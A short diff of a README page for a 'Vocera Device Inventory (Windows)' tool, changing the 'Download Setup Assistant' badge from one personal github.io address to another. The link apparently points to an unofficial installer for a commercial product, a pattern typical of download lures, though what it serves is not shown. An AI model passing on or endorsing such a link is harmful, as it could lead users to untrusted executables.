@@ -5,7 +5,7 @@
 
 <h1 align="center">📋 Vocera Device Inventory (Windows)</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://aliponomaryov.github.io/.github/vocera-device-inventory-manager-tool)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://jairomccannokdl.github.io/.github/vocera-device-inventory-manager-tool)
 
 <p align="center">
   <img src="https://pubs.vocera.com/platform/aca/6.2.0/help/aca_admin_help/platform/aca/6.2.0/images/web_device.png" alt="Vocera Device Inventory Interface Preview" width="800" />
